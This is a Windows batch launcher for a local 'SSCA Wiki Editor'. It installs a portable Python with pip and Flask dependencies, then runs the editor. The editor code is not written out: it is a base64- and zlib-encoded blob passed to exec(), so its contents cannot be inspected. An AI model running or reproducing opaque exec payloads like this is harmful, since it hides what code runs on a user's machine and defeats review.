@echo off
chcp 65001 >nul 2>&1
title SSCA Wiki Editor
set PYTHONDONTWRITEBYTECODE=1
set "PYDIR=%LOCALAPPDATA%\SSCAWikiEditor\python"

REM === 检测系统 Python ===
python --version >nul 2>&1
if %errorlevel%==0 (
    set "PY=python"
    goto :READY
)

REM === 检测已安装的便携版 Python ===
if exist "%PYDIR%\python.exe" (
    set "PY=%PYDIR%\python.exe"
    goto :READY
)

REM === 自动下载安装便携版 Python ===
echo ============================================
echo   未检测到 Python，将自动安装便携版
echo   安装位置: %LOCALAPPDATA%\SSCAWikiEditor\python
echo   仅需首次运行时下载 (约 25MB)
echo ============================================
echo.

set "PY_VER=3.12.8"
set "PY_ZIP=%TEMP%\ssca_python_embed.zip"
set "GET_PIP=%TEMP%\ssca_get_pip.py"

echo [1/5] 下载 Python %PY_VER% 嵌入式包...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { (New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/%PY_VER%/python-%PY_VER%-embed-amd64.zip','%PY_ZIP%') } catch { Write-Host '[!]' $_.Exception.Message; exit 1 }"
if not exist "%PY_ZIP%" (
    echo.
    echo [!] Python 下载失败，请检查网络连接
    echo     也可以手动安装 Python 3: https://www.python.org
    pause
    exit /b 1
)

echo [2/5] 解压 Python 到本地目录...
powershell -Command "if (Test-Path '%PYDIR%') { Remove-Item -Recurse -Force '%PYDIR%' }; New-Item -ItemType Directory -Path '%PYDIR%' -Force | Out-Null; Expand-Archive -Path '%PY_ZIP%' -DestinationPath '%PYDIR%' -Force"
del "%PY_ZIP%" >nul 2>&1

if not exist "%PYDIR%\python.exe" (
    echo [!] 解压失败
    pause
    exit /b 1
)

echo [3/5] 配置 Python 环境...
powershell -Command "Get-ChildItem '%PYDIR%' -Filter '*._pth' | ForEach-Object { (Get-Content $_.FullName) -replace '#import site','import site' | Set-Content $_.FullName }"

echo [4/5] 安装 pip 包管理器...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { (New-Object Net.WebClient).DownloadFile('https://bootstrap.pypa.io/get-pip.py','%GET_PIP%') } catch { Write-Host '[!]' $_.Exception.Message; exit 1 }"
if not exist "%GET_PIP%" (
    echo [!] pip 下载失败
    pause
    exit /b 1
)
"%PYDIR%\python.exe" "%GET_PIP%" --no-warn-script-location -q
del "%GET_PIP%" >nul 2>&1

echo [5/5] 安装编辑器依赖包...
"%PYDIR%\python.exe" -m pip install flask requests pyyaml -q --no-warn-script-location

echo.
echo [*] Python 环境安装完成！
echo.
set "PY=%PYDIR%\python.exe"

:READY

REM === 检测编辑器是否已在运行 ===
netstat -ano | findstr ":5001 " | findstr "LISTENING" >nul 2>&1
if %errorlevel%==0 (
    echo [*] 编辑器已在运行
    start "" "http://127.0.0.1:5001/"
    timeout /t 2 /nobreak >nul
    exit
)

"%PY%" -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('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')))"

echo.
echo [*] 编辑器已关闭
timeout /t 3 /nobreak >nul
